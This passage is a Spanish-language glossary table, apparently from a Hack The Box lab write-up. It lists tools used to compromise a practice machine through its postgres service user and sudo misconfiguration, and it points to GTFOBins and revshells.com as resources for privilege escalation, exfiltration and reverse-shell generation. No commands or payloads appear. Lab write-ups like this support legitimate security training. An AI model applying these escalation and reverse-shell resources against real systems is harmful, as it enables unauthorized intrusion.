| **sudo** | Mecanismo de privilegios | Permite ejecutar comandos con privilegios de otro usuario (normalmente root). Su configuración errónea es un vector habitual de escalada de privilegios. | Nativo en sistemas Linux |
| **GTFOBins** | Referencia de escalada | Base de datos web que cataloga binarios Unix explotables para escalada de privilegios, evasión de restricciones y exfiltración de datos. | `https://gtfobins.github.io` |
| **revshells.com** | Generador de payloads | Plataforma web para generar comandos de reverse shell en múltiples lenguajes y formatos. | `https://www.revshells.com` |
| **SSH** | Protocolo de acceso remoto | Protocolo de acceso remoto seguro. Preferible a una reverse shell cuando se dispone de credenciales válidas. | Nativo en sistemas Linux |
| **PostgreSQL** | Base de datos | Sistema gestor de bases de datos relacional. El usuario `postgres` es el de servicio explotado en esta máquina. | Nativo en el servidor víctima |
| **Hack The Box (HTB)** | Plataforma | Plataforma de práctica de ciberseguridad con máquinas vulnerables en entornos controlados. | `https://www.hackthebox.com` |
| **VPN (tun0)** | Red | Interfaz de red virtual generada por la VPN de Hack The Box para conectarse al entorno de laboratorio. | Archivo `.ovpn` descargable desde HTB |
```
